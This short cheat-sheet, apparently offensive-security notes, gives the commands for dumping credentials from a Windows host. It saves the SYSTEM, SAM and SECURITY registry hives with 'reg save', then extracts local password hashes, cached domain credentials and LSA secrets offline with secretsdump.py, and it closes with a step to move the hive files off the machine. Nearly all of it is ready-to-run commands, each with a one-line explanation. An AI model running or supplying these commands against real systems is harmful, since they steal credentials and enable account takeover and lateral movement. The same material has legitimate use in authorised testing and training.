
Offline SAM & LSA Secrets from Hives:

```bash
secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
```

Including the SECURITY Hive in Dumping Process:

Dump SYSTEM Hive:

```bash
reg save HKLM\system C:\users\Administrator\Desktop\system-reg
```
    Explanation: Necessary for decrypting hashes with SAM or SECURITY.

Dump SAM Hive:

```bash
reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
```
    Explanation: Contains local account password hashes.

Dump SECURITY Hive:

```bash
reg save HKLM\security C:\users\Administrator\Desktop\security-reg
```
    Explanation: Holds LSA secrets, including cached domain credentials.

Secure Hive File Transfer:

    Transfer hives securely: Move sam-reg, system-reg, and security-reg for analysis.

